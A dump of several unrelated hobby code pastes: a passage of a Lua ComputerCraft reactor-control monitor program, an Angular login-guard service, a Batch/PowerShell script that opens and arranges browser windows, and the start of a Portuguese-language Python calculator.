            mon.write("" "")
            mon.setCursorPos(xoff + i + 1, yoff + size[2])
            mon.write("" "")
        end
        for i=0, size[2] - 1 do
            mon.setCursorPos(xoff + 1, yoff + i + 1)
            mon.write("" "")
            mon.setCursorPos(xoff + size[1], yoff + i +1)
            mon.write("" "")
        end
        mon.setCursorPos(x,y)
        mon.setBackgroundColor(colors.black)
    end
end

--Draw a filled box
local function drawFilledBox(size, xoff, yoff, colorOut, colorIn)
    if (monSide ~= nil) then
        local horizLine = """"
        for i=2, size[1] - 1 do
            horizLine  = horizLine.."" ""
        end
        drawBox(size, xoff, yoff, colorOut)
        local x,y = mon.getCursorPos()
        mon.setBackgroundColor(colorIn)
        for i=2, size[2] - 1 do
            mon.setCursorPos(xoff + 2, yoff + i)
            mon.write(horizLine)
        end
        mon.setBackgroundColor(colors.black)
        mon.setCursorPos(x,y)
    end
end

--Draws text on the screen
local function drawText(text, x1, y1, backColor, textColor)
    if (monSide ~= nil) then
        local x, y = mon.getCursorPos()
        mon.setCursorPos(x1, y1)
        mon.setBackgroundColor(backColor)
        mon.setTextColor(textColor)
        mon.write(text)
        mon.setTextColor(colors.white)
        mon.setBackgroundColor(colors.black)
        mon.setCursorPos(x,y)
    end
end

--Helper method for adding buttons
local function addButt(name, callBack, size, xoff, yoff, color1, color2)
    if (monSide ~= nil) then
        t:add(name, callBack, 
            xoff + 1, yoff + 1, 
            size[1] + xoff, size[2] + yoff, 
            color1, color2)	
    end
end

--adds buttons
local function addButtons()
    if (sizey == 24) then
        oo = 1
    end
    addButt(""On"", nil, {8, 3}, dim + 7, 3 + oo,
        colors.red, colors.lime)
    addButt(""Off"", nil, {8, 3}, dim + 19, 3 + oo,
        colors.red, colors.lime)
    if (btnOn) then
        t:toggleButton(""On"")
    else
        t:toggleButton(""Off"")
    end
    if (sizey > 24) then
        addButt(""+ 10"", nil, {8, 3}, dim + 7, 14 + oo,
            colors.purple, colors.pink)
        addButt("" + 10 "", nil, {8, 3}, dim + 19, 14 + oo,
            colors.magenta, colors.pink)
        addButt(""- 10"", nil, {8, 3}, dim + 7, 18 + oo,
            colors.purple, colors.pink)
        addButt("" - 10 "", nil, {8, 3}, dim + 19, 18 + oo,
            colors.magenta, colors.pink)
    end
end

--Resets the monitor
local function resetMon()
    if (monSide ~= nil) then
        mon.setBackgroundColor(colors.black)
        mon.clear()
        mon.setTextScale(0.5)
        mon.setCursorPos(1,1)
    end
end

local function getPercPower()
    return storedThisTick / capacity * 100
end

local function rnd(num, dig)
    return math.floor(10 ^ dig * num) / (10 ^ dig)
end

local function getEfficiency()
    return lastRFT / fuelUsage
end

local function getGenRatio()
    return lastRFT / capacity
end

local function format(num)
    if (num >= 1000000000) then
        return string.format(""%7.3f G"", num / 1000000000)
    elseif (num >= 1000000) then
        return string.format(""%7.3f M"", num / 1000000)
    elseif (num >= 1000) then
        return string.format(""%7.3f K"", num / 1000)
    elseif (num >= 1) then
        return string.format(""%7.3f "", num)
    elseif (num >= .001) then
        return string.format(""%7.3f m"", num * 1000)
    elseif (num >= .000001) then
        return string.format(""%7.3f u"", num * 1000000)
    else
        return string.format(""%7.3f "", 0)
    end
end

local function getAvailableXOff()
    for i,v in pairs(XOffs) do
        if (v[2] and v[1] < dim) then
            v[2] = false
            return v[1]
        end
    end
    return -1
end

local function getXOff(num)
    for i,v in pairs(XOffs) do
        if (v[1] == num) then
            return v
        end
    end
    return nil
end

local function disableGraph(name)
    if (graphsToDraw[name] ~= nil) then
        if (displayingGraphMenu) then
            t:toggleButton(name)
        end
        getXOff(graphsToDraw[name])[2] = true
        graphsToDraw[name] = nil
    end
end

local function addGraphButtons()
    offy = oo - 14
    for i,v in pairs(graphs) do
        addButt(v, nil, {20, 3},
            dim + 7, offy + i * 3 - 1,
            colors.red, colors.lime)
        if (graphsToDraw[v] ~= nil) then
            t:toggleButton(v)
        end
    end
end

local function drawGraphButtons()
    drawBox({sizex - dim - 3, oo - offy - 1}, 
        dim + 2, offy, colors.orange)
    drawText("" Graph Controls "",
        dim + 7, offy + 1,
        colors.black, colors.orange)
end

local function isGraph(name)
    for i,v in pairs(graphs) do
        if (v == name) then
            return true
        end
    end
    return false
end

local function getGraph(num)
    for i,v in pairs(graphsToDraw) do
        if (v == num) then
            return i
        end
    end
    return nil
end

local function enableGraph(name)
    if (graphsToDraw[name] == nil) then
        local e = getAvailableXOff()
        if (e ~= -1) then
            graphsToDraw[name] = e
            if (displayingGraphMenu) then
                t:toggleButton(name)
            end
        end
    end
end

local function toggleGraph(name)
    if (graphsToDraw[name] == nil) then
        enableGraph(name)
    else
        disableGraph(name)
    end
end

local function drawEnergyBuffer(xoff)
    local srf = sizey - 9
    local off = xoff
    local right = off + 19 < dim
    local poff = right and off + 15 or off - 6

    drawBox({15, srf + 2}, off - 1, 4, colors.gray)
    local pwr = math.floor(getPercPower() / 100 
        * (srf))
    drawFilledBox({13, srf}, off, 5,
        colors.red, colors.red)
    local rndpw = rnd(getPercPower(), 2)
    local color = (rndpw < maxb and rndpw > minb) and colors.green
    or (rndpw >= maxb and colors.orange or colors.blue)
    if (pwr > 0) then
        drawFilledBox({13, pwr + 1}, off, srf + 4 - pwr,
            color, color)
    end
    --drawPoint(off + 14, srf + 5 - pwr, pwr > 0 and color or colors.red)
    drawText(string.format(right and ""%.2f%%"" or ""%5.2f%%"", rndpw), poff, srf + 5 - pwr,
        colors.black, color)
    drawText(""Energy Buffer"", off + 1, 4,
        colors.black, colors.orange)
    drawText(format(storedThisTick)..""RF"", off + 1, srf + 5 - pwr,
        pwr > 0 and color or colors.red, colors.black)
end

local function drawControlLevel(xoff)
    local srf = sizey - 9
    local off = xoff
    drawBox({15, srf + 2}, off - 1, 4, colors.gray)
    drawFilledBox({13, srf}, off, 5,
        colors.red, colors.red)
    local rodTr = math.floor(rod / 100 
        * (srf))
    drawText(""Control Level"", off + 1, 4,
        colors.black, colors.orange)
    if (rodTr > 0) then
        drawFilledBox({9, rodTr}, off + 2, 5,
            colors.orange, colors.orange)
    end
    drawText(string.format(""%6.2f%%"", rod), off + 4, rodTr > 0 and rodTr + 5 or 6,
        rodTr > 0 and colors.orange or colors.red, colors.black)

end

local function drawTemperatures(xoff)
    local srf = sizey - 9
    local off = xoff
    drawBox({15, srf + 2}, off, 4, colors.gray)
    --drawFilledBox({12, srf}, off, 5,
    --	colors.red, colors.red)

    local fuelRnd = math.floor(fuelTemp - 273)
    local caseRnd = math.floor(caseTemp - 273)
    local fuelTr = math.floor(fuelRnd / 2000 
        * (srf))
    local caseTr = math.floor(caseRnd / 2000
        * (srf))
    drawText("" Case "", off + 2, 5,
        colors.gray, colors.lightBlue)
    drawText("" Fuel "", off + 9, 5,
        colors.gray, colors.magenta)
    if (fuelTr > 0) then
        fuelTr = math.min(fuelTr, srf)
        drawFilledBox({6, fuelTr}, off + 8, srf + 5 - fuelTr,
            colors.magenta, colors.magenta)

        drawText(string.format(""%4sC"", fuelRnd ..""""), 
            off + 10, srf + 6 - fuelTr,
            colors.magenta, colors.black)
    else
        drawText(string.format(""%4sC"", fuelRnd ..""""), 
            off + 10, srf + 5,
            colors.black, colors.magenta)
    end

    if (caseTr > 0) then
        caseTr = math.min(caseTr, srf)
        drawFilledBox({6, caseTr}, off + 1, srf + 5 - caseTr,
            colors.lightBlue, colors.lightBlue)
        drawText(string.format(""%4sC"", caseRnd - 273..""""), 
            off + 3, srf + 6 - caseTr,
            colors.lightBlue, colors.black)
    else
        drawText(string.format(""%4sC"", caseRnd - 273..""""), 
            off + 3, srf + 5,
            colors.black, colors.lightBlue)
    end

    drawText(""Temperatures"", off + 2, 4,
        colors.black, colors.orange)
    drawBox({1, srf}, off + 7, 5,
        colors.gray)
end

local beg
local function drawGraph(name, offset)
    if (name == ""Energy Buffer"") then
        drawEnergyBuffer(offset)
    elseif (name == ""Control Level"") then
        drawControlLevel(offset)
    elseif (name == ""Temperatures"") then
        drawTemperatures(offset)
    end
end

local function drawGraphs()
    for i,v in pairs(graphsToDraw) do
        if (v + 15 < dim) then
            drawGraph(i,v)
        end
    end
end

local function drawStatus()
    if (dim > -1) then
        drawBox({dim, sizey - 2},
            1, 1, colors.lightBlue)
        drawText("" Reactor Graphs "", dim - 18, 2, 
            colors.black, colors.lightBlue)
        drawGraphs()
    end
end

local function drawControls()
    if (sizey == 24) then
        drawBox({sizex - dim - 3, 9}, dim + 2, oo, 
            colors.cyan)
        drawText("" Reactor Controls "", dim + 7, oo + 1, 
            colors.black, colors.cyan)
        drawText(""Reactor ""..(btnOn and ""Online"" or ""Offline""), 
            dim + 10, 3 + oo,
            colors.black, btnOn and colors.green or colors.red)
    else
        drawBox({sizex - dim - 3, 23}, dim + 2, oo, 
            colors.cyan)
        drawText("" Reactor Controls "", dim + 7, oo + 1, 
            colors.black, colors.cyan)
        drawFilledBox({20, 3}, dim + 7, 8 + oo,
            colors.red, colors.red)
        drawFilledBox({(maxb - minb) / 5, 3}, 
            dim + 7 + minb / 5, 8 + oo, 
            colors.green, colors.green)
        drawText(string.format(""%3s"", minb..""%""), dim + 6 + minb / 5, 12 + oo,
            colors.black, colors.purple)
        drawText(maxb..""%"", dim + 8 + maxb / 5, 12 + oo,
            colors.black, colors.magenta)
        drawText(""Buffer Target Range"", dim + 8, 8 + oo,
            colors.black, colors.orange)
        drawText(""Min"", dim + 10, 14 + oo,
            colors.black, colors.purple)
        drawText(""Max"", dim + 22, 14 + oo,
            colors.black, colors.magenta)
        drawText(""Reactor "".. (btnOn and ""Online"" or ""Offline""), 
            dim + 10, 3 + oo,
            colors.black, btnOn and colors.green or colors.red)
    end
end

local function drawStatistics()
    local oS = sizey - 13
    drawBox({sizex - dim - 3, sizey - oS - 1}, dim + 2, oS,
        colors.blue)
    drawText("" Reactor Statistics "", dim + 7, oS + 1,
        colors.black, colors.blue)

    --statistics
    drawText(""Generating : ""
        ..format(lastRFT)..""RF/t"", dim + 5, oS + 3,
        colors.black, colors.green)
    drawText(""RF Drain   ""
        ..(storedThisTick <= lastRFT and ""> "" or "": "")
        ..format(rfLost)
        ..""RF/t"", dim + 5, oS + 5,
        colors.black, colors.red)
    drawText(""Efficiency : ""
        ..format(getEfficiency())..""RF/B"", 
        dim + 5, oS + 7,
        colors.black, colors.green)
    drawText(""Fuel Usage : ""
        ..format(fuelUsage)
        ..""B/t"", dim + 5, oS + 9,
        colors.black, colors.green)
    drawText(""Waste      : ""
        ..string.format(""%7d mB"", waste),
        dim + 5, oS + 11,
        colors.black, colors.green)
end

--Draw a scene
local function drawScene()
    if (monSide ~= nil) then
        t:draw()
    end
    if (displayingGraphMenu) then
        drawGraphButtons()
    end
    if (invalidDim) then
        if (monSide ~= nil) then
            mon.write(""Invalid Monitor Dimensions"")
        end
    else
        drawControls()
        drawStatus()
        drawStatistics()
    end
end

--Redraws all the buttons
--Updates the important values
local function reDrawButtons()
    if (monSide ~= nil) then
        t = touchpoint.new(monSide)
        sizex, sizey = mon.getSize()
        oo = sizey - 37
        dim = sizex - 33
    end
    --print(sizex, sizey)
    if (sizex == 36) then
        dim = -1
    end
    if (pcall(addGraphButtons)) then
        drawGraphButtons()
        displayingGraphMenu = true
    else
        if (monSide ~= nil) then
            t = touchpoint.new(monSide)
        end
        displayingGraphMenu = false
    end
    local rtn = pcall(addButtons)
    if (not rtn) then
        if (monSide ~= nil) then
            t = touchpoint.new(monSide)
        end
        invalidDim = true
    else
        invalidDim = false
    end
    --t:draw()
end

local function setRods(level)
    level = math.max(level, 0)
    level = math.min(level, 100)
    reactor.setAllControlRodLevels(level)
end

--Turns off the reactor
local function turnOff()
    if (btnOn) then
        t:toggleButton(""Off"")
        t:toggleButton(""On"")
        btnOff = true
        btnOn = false
        setRods(100)
        reactor.setActive(false)
    end
end

--Turns on the reactor
local function turnOn()
    if (btnOff) then
        t:toggleButton(""Off"")
        t:toggleButton(""On"")
        btnOff = false
        btnOn = true
        reactor.setActive(true)
    end
end

--adjusts the level of the rods
local function adjustRods()
    local currentRF = storedThisTick
    local diffb = maxb - minb
    maxRF = maxb / 100 * capacity
    minRF = minb / 100 * capacity
    diffRF = diffb / 100 * capacity
    local diffr = diffb / 100
    local targetRFT = rfLost
    local currentRFT = lastRFT
    local diffRFT = currentRFT/targetRFT
    local targetRF = diffRF / 2 + minRF

    currentRF = math.min(currentRF, maxRF)
    local equation1 = math.min((currentRF - minRF)/diffRF, 1)
    equation1 = math.max(equation1, 0)
    
	local rodLevel = rod
    if (storedThisTick < minRF) then
        rodLevel = 0
    elseif ((storedThisTick < maxRF and storedThisTick > minRF)) then
        equation1 = equation1 * (currentRF / targetRF) --^ 2
        equation1 = equation1 * diffRFT --^ 5
        equation1 = equation1 * 100

        rodLevel = equation1
    elseif (storedThisTick > maxRF) then
        rodLevel = 100
    end
    setRods(rodLevel)
end

--Saves the configuration of the reactor controller
local function saveChanges()
    local file = fs.open(tag.."".txt"", ""w"")
    file.writeLine(calibrated)
    if (calibrated) then
        file.writeLine(capacity)
        file.writeLine(maxRFT)
    end
    file.writeLine(maxb)
    file.writeLine(minb)
    file.writeLine(rod)
    file.writeLine(btnOn)
    for i,v in pairs(XOffs) do
        local graph = getGraph(v[1])
        graph = (graph == nil and ""nil"" or graph)
        file.writeLine(graph)
        file.writeLine(v[1])
    end
    file.close()
end

--returns the side that a given peripheral type is connected to
local function getPeripheral(name)
    for i,v in pairs(peripheral.getNames()) do
        if (peripheral.getType(v) == name) then
            return v
        end
    end
    return """"
end

local function updateStats()
    storedLastTick = storedThisTick
    if (reactorVersion == ""Big Reactors"") then
        storedThisTick = reactor.getEnergyStored()
        lastRFT = reactor.getEnergyProducedLastTick()
        rod = reactor.getControlRodLevel(0)
        fuelUsage = reactor.getFuelConsumedLastTick() / 1000
        waste = reactor.getWasteAmount()
        fuelTemp = reactor.getFuelTemperature()
        caseTemp = reactor.getCasingTemperature()
    elseif (reactorVersion == ""Extreme Reactors"") then
        local bat = reactor.getEnergyStats()
        local fuel = reactor.getFuelStats()

        storedThisTick = bat.energyStored
        lastRFT = bat.energyProducedLastTick
        capacity = bat.energyCapacity
        rod = reactor.getControlRodLevel(0)
        fuelUsage = fuel.fuelConsumedLastTick / 1000
        waste = reactor.getWasteAmount()
        fuelTemp = reactor.getFuelTemperature()
        caseTemp = reactor.getCasingTemperature()
    elseif (reactorVersion == ""Bigger Reactors"") then
   		storedThisTick = reactor.battery().stored()
        lastRFT = reactor.battery().producedLastTick()
        capacity = reactor.battery().capacity()
        rod = reactor.getControlRod(0).level()
        fuelUsage = reactor.fuelTank().burnedLastTick() / 1000
        waste = reactor.fuelTank().waste()
        fuelTemp = reactor.fuelTemperature()
        caseTemp = reactor.casingTemperature()
    end
    rfLost = lastRFT + storedLastTick - storedThisTick
end

--Updates statistics and adjusts the rods
local function compute()
    updateStats()
    if (btnOn) then
        adjustRods()
    end
end

--The main routine that runs each tick
function routine()
    while (true) do
        --[[
        If the graphs are drawn every tick, everything
        just breaks.
        If the graphs are drawn every 2nd tick, my
        RFLost calculation is wrong every time
        If the graphs are drawn every 3rd tick, my
        RFLost calculation is wrong sometimes

        THIS MAKES NO SENSE
        ]]
        for i = 1,4 do	
            compute()
            sleep(0.01)
        end
        resetMon()
        drawScene()
    end
end

--Manages window resizing events
function resizer()
    while (true) do
        local event = os.pullEvent(""monitor_resize"")
        if (event == ""monitor_resize"") then
            reDrawButtons()
        end
    end
end

local function calibrate()
    setRods(0)
    reactor.setActive(true)
    sleep(15)
    updateStats()
    setRods(100)
    reactor.setActive(false)
    if (reactorVersion == ""Big Reactors"") then
        capacity = storedThisTick
    end
    maxRFT = lastRFT
end

--Initialize variables from either a config file or the defaults
local function initializeVars()
    invalidDim = false
    if (not fs.exists(tag.."".txt"")) then
        print(""Config file ""..tag.."" not found, generating a default one!"")
        repeat
            print(""The program can be optionally calibrated. Proceed? (y/n) "")
            local response = read()
            if (response == ""n"") then
                print(""Calibration skipped. Some functions may be unavailable"")
                calbrated = false
            elseif (response == ""y"") then
                print(""Beginning 15 second calibration, do not turn off the reactor!"")
                calibrate()
                print(""Calibrated!"")
                calibrated = true
            end
        until response == ""y"" or response == ""n""
        
        maxb = 70
        minb = 30
        rod = 80
        btnOn = false
        if (monSide == nil) then
            btnOn = true
        end
        dim = sizex - 33
        oo = sizey - 37
        enableGraph(""Energy Buffer"")
        enableGraph(""Control Level"")
        enableGraph(""Temperatures"")
    else
        local file = fs.open(tag.."".txt"", ""r"")
        print(""Config file ""..tag.."" found! Using configurated settings"")

        calibrated = file.readLine() == ""true""
        
        --read calibration information
        if (calibrated) then
        	capacity = tonumber(file.readLine())
        	maxRFT = tonumber(file.readLine())
        end
        maxb = tonumber(file.readLine())
        minb = tonumber(file.readLine())
        rod = tonumber(file.readLine())
        btnOn = file.readLine() == ""true""

        --read Graph data
        for i in pairs(XOffs) do
            local graph = file.readLine()
            local v1 = tonumber(file.readLine())
            local v2 = true
            if (graph ~= ""nil"") then
                v2 = false
                graphsToDraw[graph] = v1
            end

            XOffs[i] = {v1, v2}

        end
        file.close()
    end
    btnOff = not btnOn
    diffb = maxb - minb
    reactor.setActive(btnOn)
end

--Initialize program
local function initialize()
    term.setBackgroundColor(colors.black)
    term.clear()
    term.setCursorPos(1,1)
    os.loadAPI(""/usr/apis/touchpoint.lua"")
    reactorSide = getPeripheral(""BiggerReactors_Reactor"")
    reactorVersion = ""Bigger Reactors""
    reactor = peripheral.wrap(reactorSide)
    if (reactor == nil) then
        reactorSide = getPeripheral(""BigReactors-Reactor"")
        reactor = peripheral.wrap(reactorSide)
        if (reactor.mbIsConnected ~= nil) then
            reactorVersion = ""Extreme Reactors""
        else
            reactorVersion = ""Big Reactors""
        end
    end
    if (reactor == nil) then
        reactorSide = getPeripheral(""bigger-reactor"")
        reactor = peripheral.wrap(reactorSide)
		reactorVersion = ""Big Reactors""
    end
    monSide = getPeripheral(""monitor"")
    monSide = monSide == """" and nil or monSide
    sizex, sizey = 36, 38
    if (monSide ~= nil) then
        mon = peripheral.wrap(monSide)
        sizex, sizey = mon.getSize()
        resetMon()
    end
    return reactor ~= nil
end

--Entry point
function threadMain()
    repeat 
        local good = initialize()
        if (not good) then
            print(""Reactor could not be detected! Trying again"")
            sleep(1)
        else
            print(""Reactor detected! Proceeding with initialization: "")
        end
    until (good)
    initializeVars()
    reDrawButtons()
    saveChanges()
    print(""Reactor initialization done!"")
	sleep(2)
    term.clear()
    term.setCursorPos(1,1)
    os.startThread(resizer)
    os.startThread(routine)
    print(""Reactor Controller Version ""..version)
    print(""Reactor Mod: ""..reactorVersion)
    --main loop
    --local lastTime = 0

    os.startTimer(0.01)
    while (true) do
        local event, p1
        if (monSide ~= nil) then
            event, p1 = t:handleEvents(os.pullEvent(""monitor_touch""))
        else
            event = os.pullEvent(""monitor_touch"")
        end
        if (event == ""button_click"") then
            if (p1 == ""Off"") then
                turnOff()
            elseif (p1 == ""On"") then
                turnOn()
            elseif (p1 == ""+ 10"") then
                minb = math.min(maxb - 10, minb + 10)
            elseif (p1 == ""- 10"") then
                minb = math.max(0, minb - 10)
            elseif (p1 == "" + 10 "") then
                maxb = math.min(100, maxb + 10)
            elseif (p1 == "" - 10 "") then
                maxb = math.max(minb + 10, maxb - 10)
            elseif (isGraph(p1)) then
                toggleGraph(p1)
            end
            saveChanges()
        end
    end
end

--thread stuff below here
local threads = {}
local starting = {}
local eventFilter = nil

rawset(os, ""startThread"", function(fn, blockTerminate)
        table.insert(starting, {
                cr = coroutine.create(fn),
                blockTerminate = blockTerminate or false,
                error = nil,
                dead = false,
                filter = nil
            })
    end)

local function tick(t, evt, ...)
    if t.dead then return end
    if t.filter ~= nil and evt ~= t.filter then return end
    if evt == ""terminate"" and t.blockTerminate then return end

    coroutine.resume(t.cr, evt, ...)
    t.dead = (coroutine.status(t.cr) == ""dead"")
end

local function tickAll()
    if #starting > 0 then
        local clone = starting
        starting = {}
        for _,v in ipairs(clone) do
            tick(v)
            table.insert(threads, v)
        end
    end
    local e
    if eventFilter then
        e = {eventFilter(coroutine.yield())}
    else
        e = {coroutine.yield()}
    end
    local dead = nil
    for k,v in ipairs(threads) do
        tick(v, unpack(e))
        if v.dead then
            if dead == nil then dead = {} end
            table.insert(dead, k - #dead)
        end
    end
    if dead ~= nil then
        for _,v in ipairs(dead) do
            table.remove(threads, v)
        end
    end
end

rawset(os, ""setGlobalEventFilter"", function(fn)
        if eventFilter ~= nil then error(""This can only be set once!"") end
        eventFilter = fn
        rawset(os, ""setGlobalEventFilter"", nil)
    end)

if type(threadMain) == ""function"" then
    os.startThread(threadMain)
else
    os.startThread(function() shell.run(""shell"") end)
end

while #threads > 0 or #starting > 0 do
    tickAll()
end

print(""All threads terminated!"")
print(""Exiting thread manager"")
"
6AASAkK5,api service,kklevi,TypeScript,Sunday 28th of May 2023 03:03:24 PM CDT,"//api.service.ts

import { Injectable } from '@angular/core';
import { Router } from '@angular/router';


@Injectable({
  providedIn: 'root'
})
export class ApiService {

  router: Router
  constructor(router: Router) {
    this.router = router
  }

  public isLoggedIn():boolean {

    let token = localStorage.getItem('forum-token')
    // TODO check expiration date etc.
    let tokenExpireString = localStorage.getItem('forum-token-expiration')
    return token !== null
  }

  public canActivate():boolean{
    if(!this.isLoggedIn()){
      this.router.navigate(['/login'])
      return false;
    }
    return true;
  }

  //private tokenExpired(token: string) {
    //const expiry = (JSON.parse(atob(token.split('.')[1]))).exp;
    //const expiry = token;
    //return (Math.floor((new Date).getTime() / 1000)) >= expiry;
  //}
}
"
VWq3PKQ9,Batch/Powershell/C# chimera,sintrode,Batch,Sunday 28th of May 2023 02:18:50 PM CDT,"<# :
:: Based on https://gist.github.com/coldnebo/1148334
:: Converted to a batch/powershell hybrid via http://www.dostips.com/forum/viewtopic.php?p=37780#p37780
@echo off
setlocal
cls
set ""POWERSHELL_BAT_ARGS=%*""
if defined POWERSHELL_BAT_ARGS set ""POWERSHELL_BAT_ARGS=%POWERSHELL_BAT_ARGS:""=\""%""
endlocal & powershell -NoLogo -NoProfile -Command ""$_ = $input; Invoke-Expression $( '$input = $_; $_ = \""\""; $args = @( &{ $args } %POWERSHELL_BAT_ARGS% );' + [String]::Join( [char]10, $( Get-Content \""%~f0\"" ) ) )""
goto :EOF
#>

# Add the relevant section of the Win32 API to the PowerShell session 
# Allows windows to be moved and resized
Add-Type @""
	using System;
	using System.Runtime.InteropServices;
	
	public class Win32 { 
		[DllImport(""user32.dll"")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
	}
""@

################################################################################
# Moves and resizes the window based the broswer
#
# Arguments: $browser - the browser being moved and resized
# Returns:   None
################################################################################
Function MoveAndResize ($browser)
{
	# $browser_path is the full path to the browser
	# $screen_x is the horizontal location of the window on the screen
	# $screen_y is the vertical location of the window on the screen
	# $win_x is the width of the target window
	# $win_y is the height of the target window
	Switch($browser){
		InternetExplorer{
			$browser_path=""C:\Program Files\Internet Explorer\IEXPLORE.EXE""
			$screen_x = 0
			$screen_y = 0
			$win_x = 960
			$win_y = 1080
			break
		}
		Firefox{
			$browser_path=""C:\Program Files (x86)\Mozilla Firefox\firefox.exe""
			$screen_x = 960
			$screen_y = 0
			$win_x = 960
			$win_y = 1080
			break
		}
		default {continue}
	}
	
	# Start the desired browser
	Start-Process $browser_path
    
	# Wait one second until the browser is fully loaded
	Start-Sleep -S 1
	
	# Find the running process where the application path matches $browser_path
	$browser = (Get-Process | where {$_.Path -eq $browser_path}).MainWindowHandle
    
	[Win32]::MoveWindow($browser, $screen_x, $screen_y, $win_x, $win_y, $true)
}

MoveAndResize ""InternetExplorer""
MoveAndResize ""Firefox"""
V1C2Fq16,Calculator v1.12 in python,Raposa7618,Python,Sunday 28th of May 2023 02:03:26 PM CDT,"import math
import time
import os
import sympy

print('\n\n    Bem-Vindo a Calculadora v1.12')
print('              By LeFox')
time.sleep(2)

while True:
    os.system('cls')
    print(
        """"""\nn - Novidades!   c - Créditos   a - Ajuda ou Sujestão/Crítica
    
    O que você deseja usar?
    
    1 - Calculadora Padrão
    2 - Tábuada
    3 - Raízes
    4 - Equações de 1° Grau
    5 - Equações de 2º Grau
    6 - Regra de Três Simples
    7 - Seno, Cosseno e Tangente 
    8 - Calcular a Hipotenusa
    9 - Porcentagens
    0 - Calcular Médias
    t - Analizar Triangulos (Bonus)\n\n
s - Sair\n\n"""""")

    inicio = input('>>> ').lower()

    if inicio == '1':
        # Calculadora padrão
        while True:
            print('r - Voltar')
            r = []
            os.system('cls')
            print('\n\nCalculadora padrão\n\n')
            print('Digite ""="" para concluir o cálculo\n')

            soma = 0
            mult = 1
            subt = []
            divi = []
            rest = 0
            valor = []
            cont = 0

            while True:
                n = input('>>> ').lower()
                if n == 'r':
                    r.append('r')
                    break
                if not n.isnumeric():
                    if not n == '=':
                        print('Digite apenas números por favor')
                        time.sleep(2)
                        continue

                if not n == '=':
                    n = float(n)
                    soma += n
                    mult *= n
                    valor.append(n)
                    cont += 1

                    if cont == 1:
                        continue

                    elif cont > 1:
                        subt = float(valor[cont - 2]) - n
                        if not n == 0:
                            divi = float(valor[cont - 2]) / n
                            rest = float(valor[cont - 2]) % n

                        else:
                            continue

                elif n == '=':
                    os.system('cls')
                    print('\nEscolha a operação:\n'
                          '+ - * /\n\n')
                    op = input('>>> ')

                    if op == '+':
                        print('\n= ', soma)
                        break

                    elif op == '-':
                        print('\n= ', subt)
                        break

                    elif op == '*':
                        print('\n= ', mult)
                        break

                    elif op == '/':
                        if divi == 0 or divi == [] and rest == 0:
                            print('0 Não é divisível')
                        else:
                            print(f'\n= {divi}\n  ({rest})')
                        break

                    else:
                        if divi == 0 or divi == [] and rest == 0:
                            divi = '0 não pode ser dividido'
                            rest = 'Vazio'
                            print('\nSoma: {}\nSubtração: {}\nMultiplicação: {}\nDivisão: {}\nResto: {}'.format(soma, subt, mult, divi, rest))

                        else:
                            print('\nSoma: {}\nSubtração: {}\nMultiplicação: {}\nDivisão: {}\nResto: {}'.format(soma, subt, mult, divi, rest))

                            break

            if 'r' in r:
                break

            voltar1 = input('\nPara continuar precione ENTER, para retornar ao inicio digite ""r"": ').lower()
            if voltar1 == 'r':
                break
            else:
                continue

    elif inicio == '2':
        # Tabuada
        while True:
            os.system('cls')
            print('r - Voltar')
            print('\n\nTabúada\n\n')

            mult1 = input('Digite a base da tabuada que deseja(digite apenas o número)\n>>> ').lower()
            mult2 = input('Digite quantas vezes você quer multiplicar essa base\n>>> ').lower()

            if mult1 == 'r' or mult2 == 'r':
                break

            if mult1.isnumeric() and mult2.isnumeric():
                mult1 = int(float(mult1))
                mult2 = int(float(mult2))
                if mult1 == 0 or mult2 == 0:
                    print('\n0')
                else:
                    print()
                    mult3 = mult2 * mult1
                    for a in range(mult1, mult3 + 1, mult1):
                        print(a)

            else:
                print('\nDigite algo calculável por favor\n')
                time.sleep(2)
                continue

            voltar6 = input('\nPara continuar precione ENTER, para retornar ao inicio digite ""r"": ').lower()
            if voltar6 == 'r':
                break
            else:
                continue

    elif inicio == '3':
        # Calcular Raízes
        while True:
            os.system('cls')
            print('r - Voltar')
            print('\n\nRaízes\n\n')
            print('Digite um número para calcular a raiz')
            print('Apenas números inteiros são permitidos!')
            print()

            raiz = input('Número na raiz: √').lower()
            raiz1 = input('Base da raiz: ').lower()

            if raiz == 'r' or raiz == 'r':
                break

            if raiz.isnumeric() and raiz1.isnumeric():
                raiz = int(float(raiz))
                raiz1 = int(float(raiz1))

                if raiz == 0 or raiz1 == 0:
                    print('\nNão existe raiz de 0\n')
                    time.sleep(2)
                    continue
                else:
                    raiz3 = raiz ** (1 / raiz1)
                    print()
                    print('{:.2f}'.format(raiz3))
                    print()

            else:
                print('\nDigite algo calculável por favor\n')
                time.sleep(2)
                continue

            voltar2 = input('Para continuar precione ENTER, para retornar ao inicio digite ""r"": ').lower()
            if voltar2 == 'r':
                break
            else:
                continue

    elif inicio == '5':
        # Calcular Equações de 2º Grau
        while True:
            os.system('cls')
            print('r - Voltar')
            print('\n\nEquações de 2º Grau\n\n')
            print('Base: x² x n = 0\n')

            a = input('x² >>> ').lower()
            b = input('x >>> ').lower()
            c = input('n >>> ').lower()

            if a == 'r' or b == 'r' or c == 'r':
                break

            if a.isnumeric() and b.isnumeric() and c.isnumeric():
                a = int(a)
                b = int(b)
                c = int(c)
                if a == 0 or b == 0 or c == 0:
                    print('\nNão é possivél calcular com 0\n')
                    time.sleep(2)
                    continue

                else:
                    print()
                    print('Usando a fórmula de bhaskara:\n'
                          '     -b +- √b²-4*a*c\n'
                          'X = -----------------\n'
                          '           2*a')
                    print()
                    delta = (b ** 2) - (4 * a * c)
                    raiz = math.sqrt(delta)
                    print('Delta = ({})² -4 * {} * {} = √{:.0f} >>> {:.0f}'.format(b, a, c, delta, raiz))
                    print()
                    x1 = (-b + raiz) / (2 * a)
                    x2 = (-b - raiz) / (2 * a)
                    print('     {} + {}\n'
                          'X = --------- = {} \n'
                          '       2*{}'.format(b, raiz, x1, a))
                    print()
                    print('     {} + {}\n'
                          'X = --------- = {} \n'
                          '       2*{}'.format(b, raiz, x2, a))
                    print()

            else:
                print('\nDigite algo calculável por favor\n')
                time.sleep(2)
                continue

            voltar3 = input('Para continuar precione ENTER, para retornar ao inicio digite ""r"": ').lower()
            if voltar3 == 'r':
                break
            else:
                continue

    if inicio == '6':
        # Regra de Três Simples
        while True:
            os.system('cls')
            print('r - Retornar\n\n'
                  'Regra de Três Simples')
            print('''\nDigite os números nas variaveis para calcular\n\n
                [ a ][ b ]
                [ c ][ X ]\n''')

            a = input('a: ')
            b = input('b: ')
            c = input('c: ')

            if a.isnumeric() and b.isnumeric() and c.isnumeric():
                a = float(a)
